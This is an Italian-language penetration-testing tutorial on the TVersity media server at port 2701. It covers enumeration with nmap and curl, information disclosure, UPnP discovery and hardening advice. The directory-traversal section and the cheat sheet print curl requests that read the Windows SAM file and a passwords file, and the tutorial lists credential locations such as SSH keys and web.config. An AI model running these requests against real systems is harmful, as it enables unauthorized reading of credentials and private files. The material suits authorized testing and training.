---
title: 'Porta 2701 TVersity: Web UI e Information Disclosure'
slug: porta-2701-tversity
description: 'Porta 2701 TVersity nel pentest: media server con web UI esposta, disclosure dei file condivisi e analisi della superficie di accesso.'
image: /porta-2701-tversity.webp
draft: true
date: 2026-04-13T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - TVersity
  - DLNA
  - File Disclosure
---

> **Executive Summary** — TVersity è un media server per Windows che permette di condividere e streammare contenuti multimediali (video, musica, foto) verso dispositivi DLNA/UPnP come smart TV, console e media player. Gira sulla porta 2701 (HTTP) e serve un'interfaccia web per la configurazione e lo streaming. Non è un target classico del pentest enterprise — si trova su reti domestiche e piccoli uffici. Il valore nel pentest è limitato: interfaccia web senza autenticazione di default, possibili directory traversal nelle versioni vecchie e information disclosure (file locali esposti via streaming).

**Cos’è la porta 2701 (TVersity Media Server)**

* TVersity è un media server Windows sulla porta 2701 — interfaccia web spesso senza autenticazione
* Rischi: directory traversal (versioni vecchie), esposizione di file locali, information disclosure
* Poco rilevante in contesti enterprise, ma utile se presente in rete interna

## Cos'è TVersity

TVersity è un'applicazione Windows che funziona come server multimediale:

```
TVersity Server (:2701)                Dispositivi client
┌──────────────────────┐               ┌────────────────┐
│ Web UI               │ ◄── HTTP ──  │ Browser         │
│ DLNA/UPnP server     │ ◄── SSDP ── │ Smart TV        │
│                      │               │ Xbox / PS       │
│ Libreria media:      │ ── stream ──►│ Media player    │
│  C:\Users\Videos\    │               └────────────────┘
│  C:\Users\Music\     │
│  \\NAS\media\        │
└──────────────────────┘
```

L'utente configura le directory da condividere tramite l'interfaccia web sulla porta 2701. TVersity transcodifica i media in tempo reale per renderli compatibili con diversi dispositivi.

## 1. Enumerazione

### Nmap

```bash
nmap -sV -p 2701 10.10.10.40
```

```
PORT     STATE SERVICE  VERSION
2701/tcp open  http     TVersity Media Server httpd
```

### Banner e interfaccia web

```bash
curl -s http://10.10.10.40:2701/ -I
```

```
HTTP/1.1 200 OK
Server: TVersity Media Server
Content-Type: text/html
```

```bash
curl -s http://10.10.10.40:2701/
```

L'interfaccia web mostra la libreria multimediale configurata — senza autenticazione di default.

### Cosa mostra l'interfaccia

```
- Lista di file e directory condivisi
- Path completi del filesystem locale (C:\Users\admin\Videos\)
- Hostname e versione del server
- Opzioni di streaming e transcodifica
```

## 2. Rischi di Sicurezza

### Information Disclosure

L'interfaccia web espone:

* **Path del filesystem**: rivela la struttura delle directory locali, nomi utente Windows e path di rete
* **File multimediali**: foto e video personali accessibili senza autenticazione
* **Configurazione di rete**: share di rete montate (es. `\\NAS\media\`) → rivela host NAS sulla rete

### Directory Traversal (versioni vecchie)

Le versioni precedenti di TVersity erano vulnerabili a path traversal:

```bash
curl "http://10.10.10.40:2701/geturl?url=file:///C:/Windows/System32/config/SAM"
```

```bash
curl "http://10.10.10.40:2701/geturl?url=file:///C:/Users/admin/Desktop/passwords.txt"
```

Se funziona → puoi leggere qualsiasi file dal filesystem Windows. Cerca:

* `C:\Users\[user]\Desktop\` — documenti personali
* `C:\Users\[user]\.ssh\` — chiavi SSH
* `C:\inetpub\wwwroot\web.config` — credenziali web app
* File di configurazione con credenziali

Verifica la versione e cerca CVE specifici su [Exploit-DB](https://hackita.it/articoli/exploit-db):

```bash
searchsploit tversity
```

### UPnP/DLNA Exposure

TVersity annuncia la sua presenza via [UPnP/SSDP sulla porta 1900](https://hackita.it/articoli/porta-1900-ssdp). Se la rete non è segmentata, qualsiasi dispositivo sulla LAN vede il server:

```bash
# Discovery UPnP
nmap -sU -p 1900 --script=upnp-info 10.10.10.0/24
```

### Vettore per Lateral Movement

TVersity stesso non è un vettore di escalation, ma le informazioni che espone sono utili:

* **Username Windows** dai path delle directory → target per [credential attack](https://hackita.it/articoli/vulnerability-exploitation)
* **Share di rete** → target per [enumerazione SMB](https://hackita.it/articoli/smb)
* **File con credenziali** se accessibili via directory traversal

## 3. Detection & Hardening

* **Non esporre TVersity su interfacce di rete esterne** — solo localhost o VLAN dedicata
* **Aggiorna alla versione più recente** — le versioni vecchie hanno directory traversal
* **Abilita autenticazione** se disponibile nella versione in uso
* **Limita le directory condivise** — non condividere l'intero disco
* **Firewall** — porta 2701 accessibile solo dalla rete locale domestica

## 4. Cheat Sheet Finale

| Azione              | Comando                                                           |
| ------------------- | ----------------------------------------------------------------- |
| Nmap                | `nmap -sV -p 2701 target`                                         |
| Banner              | `curl -s http://target:2701/ -I`                                  |
| Interfaccia web     | `curl -s http://target:2701/`                                     |
| Directory traversal | `curl "http://target:2701/geturl?url=file:///C:/Windows/win.ini"` |
| Searchsploit        | `searchsploit tversity`                                           |
| UPnP discovery      | `nmap -sU -p 1900 --script=upnp-info target`                      |

***

Riferimento: TVersity documentation, [Exploit-DB](https://hackita.it/articoli/exploit-db), [UPnP/SSDP](https://hackita.it/articoli/porta-1900-ssdp). Uso esclusivo in ambienti autorizzati.

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
